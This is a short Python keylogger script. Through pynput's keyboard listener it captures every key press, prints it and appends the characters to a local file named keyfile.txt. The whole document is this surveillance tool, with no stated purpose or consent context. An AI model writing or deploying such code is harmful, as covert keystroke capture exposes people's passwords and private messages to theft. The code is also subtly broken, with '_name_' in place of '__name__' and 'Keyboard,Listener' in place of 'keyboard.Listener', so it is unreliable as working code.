from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting Char")

if _name_ == "__main__":
    listener = Keyboard,Listener(on_press=keyPressed)
    listener.start()
    input()